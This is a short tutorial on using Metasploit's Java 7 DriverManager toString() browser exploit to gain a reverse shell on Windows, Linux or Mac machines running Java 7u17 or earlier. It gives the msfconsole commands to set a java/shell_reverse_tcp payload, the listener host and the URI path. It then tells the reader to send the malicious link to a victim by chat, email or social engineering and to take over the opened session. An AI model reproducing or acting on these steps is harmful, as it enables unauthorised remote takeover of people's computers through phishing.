Exploit Windows, Linux or MAC PC using Java Applet Driver Manager Privileged toString() Remote Code Execution

This module abuses the java.sql.DriverManager class where the toString() method is called over user supplied classes from a doPrivileged block. The vulnerability affects Java version 7u17 and earlier. This exploit bypasses click-to-play on Internet Explorer and throws a specially crafted JNLP file. This bypass is applicable mainly to IE, where Java Web Start can be launched automatically through the ActiveX control. Otherwise, the applet is launched without click-to-play bypass.
Java 7 Update 17
Windows PC
Linux PC
MAC OS X PC
Attacker: Kali Linux
Victim PC: Windows XP
Open Kali Linux terminal type msfconsole

Now type use exploit/multi/browser/java_jre17_driver_manager
msf exploit (java_jre17_driver_manager)>set payload java/shell_reverse_tcp
msf exploit (java_jre17_driver_manager)>set lhost 192.168.1.158 (IP of Local Host)
msf exploit (java_jre17_driver_manager)>set srvhost 192.168.1.158 (This must be an address on the local machine)
msf exploit (java_jre17_driver_manager)>set uripath / (The Url to use for this exploit)
msf exploit (java_jre17_driver_manager)>exploit

Now an URL you should give to your victim http://192.168.1.158:8080
 
Send the link of the server to the victim via chat or email or any social engineering technique.
Now you have access to the victims PC. Use “Sessions -l” and the Session number to connect to the session. And Now Type “sessions -i ID“
